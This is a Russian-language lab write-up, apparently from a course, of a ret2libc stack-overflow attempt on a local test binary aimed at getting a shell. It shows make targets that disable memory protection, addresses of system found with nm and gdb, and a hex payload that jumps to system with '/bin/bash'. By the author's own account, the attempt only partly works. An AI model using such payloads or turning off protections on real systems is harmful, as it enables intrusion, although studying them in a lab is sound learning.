# TLDR
Получилось на половину. У меня получилось достучаться до sh. То есть она выдаёт ошибку, но дальше команду он исполнять не хочет. Я пробовал искать адрес через gdb, но он, видимо, выдает неправильный. Была попытка убрать debug_info, но, видимо, безуспешно.

# Solution

На этот раз мы хотим получить консоль

Для того, чтобы пример заработал, нужно выполнить команду
```
make killSLAR
```

Эта штука создаст файл, выгрузит туда конфигурацию, от отключит систему защиты. ФАЙЛ НЕ УДАЛЯТЬ. Когда закончите играться пишите
```
make aliveSLAR
```

Она впишет конфигурации обратно


Стек такой же
```
ret
ebp
ebx
---

result
* * * *
* * * *
XX XX * * <- buffer

---
---
&buffer
string <- esp
```

Как примерно должен выглядеть payload
```
A...A<system>RRRRRRRR<str><string itself>
|---|           ret
  26
```

System в код была внесена не случайно, иначе её нет в символах. Посмотрим на её адрес (сейчас у нас абсолютные адреса)
```
$ nm main | grep system

0804cb60 T __libc_system
0804c6a0 t do_system
0804cb60 W system
080daf80 r system_dirs
080daf70 r system_dirs_len
```

Адрес system `0804cb60`.

На нужно найти адрес нашей строки, для этого нужно в gdb узнать, наш esp
```
esp = 0xffffc600
str addr = esp + 0x18 = 0xffffc618 (Смотреть рисунок, мы просто попали в саму строку)
```

Предыдущий адрес не соответствует действительному, что-то тут не чисто. Это я прыгал уже на system, он мне говорил, что он находиться на адресе ffffd900. Отдаём место под ret, link и получаем адрес строчки на стэке = ffffd908. Это через gdb. Ладно, фиг с ним, залью этот

Погнали собирать эксплоит (Не факт что свежий, свежий в payload.txt)
```hex
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 60 cb 04 08 61 61 61 61 08 c6 ff ff 2f 62 69 6e 2f 62 61 73 68 00
```

sh ругается на какую-то скобочку. Есть несколько вариантов:
- Отработал CET, потому что в бинарнике я нашел endbr
- gdb рандомизовал пространство (возможно)
- Хз почему исходный esp там далеко от того, что в system.

Короче, пока неудача :(